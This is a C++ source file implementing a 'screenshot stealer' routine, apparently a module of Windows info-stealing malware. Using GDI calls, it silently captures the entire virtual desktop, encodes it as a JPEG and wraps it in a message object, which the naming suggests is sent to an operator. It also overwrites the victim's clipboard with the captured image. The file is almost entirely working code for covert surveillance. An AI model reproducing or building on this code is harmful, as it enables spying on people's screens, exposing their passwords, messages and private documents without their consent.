#include "srceenshot_stealer.h"

#include "messages/photo_message.h"

#define max(a, b) (a) > (b) ? (a) : (b)
#define min(a, b) (a) > (b) ? (b) : (a)

#include "atlimage.h"
#include "gdiplusimaging.h"
#include <fstream>

#include "messages/error_message.h"

asio::awaitable<std::unique_ptr<message_t>> srceenshot_stealer_t::steal()
{
    return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
        [](auto completion_handler)
        {
            std::thread([](auto completion_handler)
            {
                int x1, y1, x2, y2, w, h;

                x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
                y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
                x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
                y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
                w   = x2 - x1;
                h   = y2 - y1;

                HDC     hScreen = GetDC(NULL);
                HDC     hDC     = CreateCompatibleDC(hScreen);
                HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
                HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
                BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

                OpenClipboard(NULL);
                EmptyClipboard();
                SetClipboardData(CF_BITMAP, hBitmap);
                CloseClipboard();

                const auto FILE_NAME = "screenshot.jpeg";

                std::string data;
                {
                    CComPtr<IStream> stream = nullptr;
                    if(S_OK != CreateStreamOnHGlobal(nullptr, true, &stream))
                    {
                        std::move(completion_handler)(
                            std::make_unique<error_message_t>("Screenshot(ERROR): Cant create stream"));
                        return;
                    }

                    CImage image;
                    image.Attach(hBitmap);
                    image.Save(stream, Gdiplus::ImageFormatJPEG);

                    ULARGE_INTEGER data_size;
                    if(S_OK != IStream_Size(stream, &data_size))
                    {
                        std::move(completion_handler)(
                            std::make_unique<error_message_t>("Screenshot(ERROR): Cant get size of stream"));
                        return;
                    }
                    data.resize(data_size.LowPart, 'A');

                    if(S_OK != IStream_Reset(stream))
                    {
                        std::move(completion_handler)(
                            std::make_unique<error_message_t>("Screenshot(ERROR): Cant reset stream"));
                        return;
                    }

                    if(S_OK != IStream_Read(stream, data.data(), data.size()))
                    {
                        std::move(completion_handler)(
                            std::make_unique<error_message_t>("Screenshot(ERROR): Cant read stream"));
                        return;
                    }
                }

                auto to_ret = std::make_unique<photo_message_t>();
                to_ret->move_to_data_and_set_path(std::move(data), FILE_NAME);

                SelectObject(hDC, old_obj);
                DeleteDC(hDC);
                ReleaseDC(NULL, hScreen);
                DeleteObject(hBitmap);

                DLOG("screenshot have been done");

                std::move(completion_handler)(std::move(to_ret));
            }, std::move(completion_handler)).detach();
        }, asio::use_awaitable
    );
}
